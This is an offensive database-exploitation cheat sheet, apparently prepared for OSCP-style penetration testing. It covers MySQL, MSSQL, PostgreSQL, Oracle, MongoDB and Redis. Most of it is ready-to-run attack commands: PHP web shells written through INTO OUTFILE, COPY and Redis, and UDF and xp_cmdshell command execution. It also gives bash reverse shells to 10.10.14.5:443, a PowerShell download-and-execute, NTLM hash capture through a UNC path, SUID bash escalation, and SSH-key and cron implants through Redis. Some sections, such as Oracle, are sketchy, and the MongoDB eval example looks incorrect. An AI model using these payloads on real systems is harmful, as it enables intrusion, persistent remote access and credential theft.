# Database Exploitation Comprehensive Guide

## Table of Contents
1. [MySQL Exploitation](#mysql-exploitation)
2. [MSSQL Exploitation](#mssql-exploitation)
3. [PostgreSQL Exploitation](#postgresql-exploitation)
4. [Oracle Exploitation](#oracle-exploitation)
5. [MongoDB Exploitation](#mongodb-exploitation)
6. [Redis Exploitation](#redis-exploitation)

---

## MySQL Exploitation

### Connection
```bash
# Standard connection
mysql -h target -u root -p

# Without password
mysql -h target -u root

# Specific database
mysql -h target -u user -p database_name
```

### Enumeration
```sql
-- Version
SELECT @@version;
SELECT version();

-- Current user
SELECT user();
SELECT current_user();

-- List databases
SHOW DATABASES;

-- List tables
SHOW TABLES;
SHOW TABLES FROM database_name;

-- List columns
DESCRIBE table_name;
SHOW COLUMNS FROM table_name;

-- Users and privileges
SELECT user, host FROM mysql.user;
SELECT user, password FROM mysql.user;
```

### File Operations

#### Read Files
```sql
-- Read /etc/passwd
SELECT LOAD_FILE('/etc/passwd');

-- Read into table
CREATE TABLE temp(data TEXT);
LOAD DATA INFILE '/etc/passwd' INTO TABLE temp;
SELECT * FROM temp;
```

#### Write Files
```sql
-- Write web shell
SELECT '<?php system($_GET["cmd"]); ?>' INTO OUTFILE '/var/www/html/shell.php';

-- Write SSH key
SELECT 'ssh-rsa AAAAB3...' INTO OUTFILE '/root/.ssh/authorized_keys';
```

### UDF Exploitation (RCE)

#### Compile UDF
```bash
# On Kali
gcc -shared -fPIC -o udf.so udf.c
```

**udf.c:**
```c
#include <string.h>
#include <stdlib.h>

void exec_cmd(char *cmd) {
    system(cmd);
}
```

#### Upload and Load UDF
```sql
-- Create table for binary
CREATE TABLE temp(data LONGBLOB);

-- Upload UDF (via SQL injection or file upload)
-- Then load:
SELECT data FROM temp INTO DUMPFILE '/usr/lib/mysql/plugin/udf.so';

-- Create function
CREATE FUNCTION exec_cmd RETURNS STRING SONAME 'udf.so';

-- Execute command
SELECT exec_cmd('bash -c "bash -i >& /dev/tcp/10.10.14.5/443 0>&1"');
```

### Privilege Escalation

#### raptor_udf2 (Pre-compiled)
```bash
# Download
searchsploit -m linux/local/1518.c
gcc -g -c 1518.c -o raptor_udf2.o
gcc -g -shared -Wl,-soname,raptor_udf2.so -o raptor_udf2.so raptor_udf2.o -lc

# Transfer to target
# Load in MySQL
mysql> use mysql;
mysql> create table foo(line blob);
mysql> insert into foo values(load_file('/tmp/raptor_udf2.so'));
mysql> select * from foo into dumpfile '/usr/lib/mysql/plugin/raptor_udf2.so';
mysql> create function do_system returns integer soname 'raptor_udf2.so';
mysql> select do_system('chmod u+s /bin/bash');
```

---

## MSSQL Exploitation

### Connection
```bash
# Impacket
impacket-mssqlclient user:password@target -windows-auth

# sqsh
sqsh -S target -U user -P password

# PowerShell
Import-Module .\PowerUpSQL.psd1
Get-SQLServerInfo -Instance "target\instance"
```

### Enumeration
```sql
-- Version
SELECT @@VERSION;

-- Current user
SELECT SYSTEM_USER;
SELECT USER_NAME();

-- Databases
SELECT name FROM master.sys.databases;

-- Tables
SELECT * FROM INFORMATION_SCHEMA.TABLES;

-- Linked servers
EXEC sp_linkedservers;
SELECT * FROM sys.servers;

-- Check if sysadmin
SELECT IS_SRVROLEMEMBER('sysadmin');
```

### Command Execution

#### xp_cmdshell
```sql
-- Enable xp_cmdshell
EXEC sp_configure 'show advanced options', 1;
RECONFIGURE;
EXEC sp_configure 'xp_cmdshell', 1;
RECONFIGURE;

-- Execute command
EXEC xp_cmdshell 'whoami';
EXEC xp_cmdshell 'powershell -c "IEX(New-Object Net.WebClient).downloadString(''http://10.10.14.5/shell.ps1'')"';

-- Reverse shell
EXEC xp_cmdshell 'powershell -enc <base64_reverse_shell>';
```

#### OLE Automation
```sql
-- If xp_cmdshell disabled, use OLE
DECLARE @output INT;
EXEC sp_oacreate 'wscript.shell', @output OUT;
EXEC sp_oamethod @output, 'run', NULL, 'cmd /c whoami > C:\output.txt';
```

### File Operations

#### Read Files
```sql
-- Bulk insert
CREATE TABLE temp(data VARCHAR(8000));
BULK INSERT temp FROM 'C:\Windows\win.ini';
SELECT * FROM temp;
```

#### Write Files (via BCP)
```cmd
# On target (if shell access)
bcp "SELECT '<?php system($_GET[\"cmd\"]); ?>'" queryout C:\inetpub\wwwroot\shell.php -c -T
```

### Linked Server Exploitation

#### Execute on Linked Server
```sql
-- List linked servers
EXEC sp_linkedservers;

-- Execute query on linked server
EXEC ('SELECT @@version') AT [LinkedServer];

-- Enable xp_cmdshell on linked server
EXEC ('EXEC sp_configure ''show advanced options'', 1; RECONFIGURE;') AT [LinkedServer];
EXEC ('EXEC sp_configure ''xp_cmdshell'', 1; RECONFIGURE;') AT [LinkedServer];
EXEC ('EXEC xp_cmdshell ''whoami''') AT [LinkedServer];
```

### NTLM Hash Capture

#### Force Authentication
```sql
-- UNC path to attacker SMB (Responder)
EXEC xp_dirtree '\\attacker-ip\share';
EXEC xp_fileexist '\\attacker-ip\share';

-- Start Responder on attacker
sudo responder -I eth0 -v
```

---

## PostgreSQL Exploitation

### Connection
```bash
psql -h target -U postgres
psql -h target -U postgres -d database_name
```

### Enumeration
```sql
-- Version
SELECT version();

-- Current user
SELECT current_user;

-- List databases
\l
SELECT datname FROM pg_database;

-- List tables
\dt
SELECT tablename FROM pg_tables WHERE schemaname='public';

-- List columns
\d table_name
```

### File Operations

#### Read Files
```sql
-- Read /etc/passwd
CREATE TABLE temp(data TEXT);
COPY temp FROM '/etc/passwd';
SELECT * FROM temp;

-- Single line
SELECT pg_read_file('/etc/passwd', 0, 200);
```

#### Write Files
```sql
-- Write web shell
COPY (SELECT '<?php system($_GET["cmd"]); ?>') TO '/var/www/html/shell.php';
```

### Command Execution

#### Using COPY FROM PROGRAM (PostgreSQL 9.3+)
```sql
-- Create table
CREATE TABLE cmd_output(data TEXT);

-- Execute command
COPY cmd_output FROM PROGRAM 'id';

-- View output
SELECT * FROM cmd_output;

-- Reverse shell
COPY cmd_output FROM PROGRAM 'bash -c "bash -i >& /dev/tcp/10.10.14.5/443 0>&1"';
```

#### Using Large Objects
```sql
-- Create large object
SELECT lo_import('/etc/passwd', 12345);

-- Export to file
SELECT lo_export(12345, '/tmp/output.txt');
```

---

## Oracle Exploitation

### Connection
```bash
# SQLPlus
sqlplus user/password@target:1521/SID

# SQLPlus as SYSDBA
sqlplus / as sysdba
```

### Enumeration
```sql
-- Version
SELECT banner FROM v$version;

-- Current user
SELECT user FROM dual;

-- Tables
SELECT table_name FROM all_tables;
SELECT table_name FROM user_tables;

-- Columns
SELECT column_name FROM all_tab_columns WHERE table_name='TABLE';
```

### Privilege Escalation

#### TNS Poisoning
```bash
# If TNS listener vulnerable
# Redirect connections to attacker
```

#### Java Stored Procedures (if DBA)
```sql
-- Create Java class with command execution
-- Then call from PL/SQL
```

---

## MongoDB Exploitation

### Connection
```bash
# No auth
mongo target:27017

# With auth
mongo target:27017/database -u user -p password
```

### Enumeration
```javascript
// Version
db.version()

// List databases
show dbs

// Select database
use database_name

// List collections
show collections

// Find all documents
db.collection.find()
db.collection.find().pretty()

// Count documents
db.collection.count()
```

### NoSQL Injection (See NoSQL Injection Guide)

### Unauthorized Access

#### Default Config (No Auth)
```bash
# Connect without credentials
mongo target:27017

# List databases
show dbs

# Extract data
use admin
db.users.find()
```

### Command Execution (if enabled)

```javascript
// Run system command (if enabled - rare)
db.runCommand({eval: "function() { return 'whoami'; }"})
```

---

## Redis Exploitation

### Connection
```bash
# No auth
redis-cli -h target

# With auth
redis-cli -h target -a password
```

### Enumeration
```bash
# Server info
INFO

# List all keys
KEYS *

# Get value
GET key_name

# List databases
INFO keyspace

# Select database
SELECT 0
```

### Exploitation

#### Write SSH Key
```bash
# Generate SSH key
ssh-keygen -t rsa -C "redis@target"

# Connect to Redis
redis-cli -h target

# Write key to /root/.ssh/authorized_keys
config set dir /root/.ssh
config set dbfilename authorized_keys
set crackit "\n\n$(cat redis.pub)\n\n"
save

# SSH as root
ssh -i redis root@target
```

#### Write Cron Job
```bash
redis-cli -h target

config set dir /var/spool/cron/crontabs
config set dbfilename root
set crackit "\n\n*/1 * * * * bash -i >& /dev/tcp/10.10.14.5/443 0>&1\n\n"
save
```

#### Write Web Shell
```bash
config set dir /var/www/html
config set dbfilename shell.php
set crackit "<?php system($_GET['cmd']); ?>"
save

# Access shell
curl http://target/shell.php?cmd=whoami
```

---

## OSCP Quick Reference

### MySQL RCE
```sql
SELECT '<?php system($_GET["cmd"]); ?>' INTO OUTFILE '/var/www/html/shell.php';
```

### MSSQL RCE
```sql
EXEC sp_configure 'xp_cmdshell', 1; RECONFIGURE;
EXEC xp_cmdshell 'whoami';
```

### PostgreSQL RCE
```sql
COPY cmd FROM PROGRAM 'id';
```

### Redis SSH Key
```bash
config set dir /root/.ssh
config set dbfilename authorized_keys
set key "\n\nssh-rsa AAA...\n\n"
save
```

---

**Remember**: Database exploitation often leads to RCE. Master file write and command execution for each DBMS!
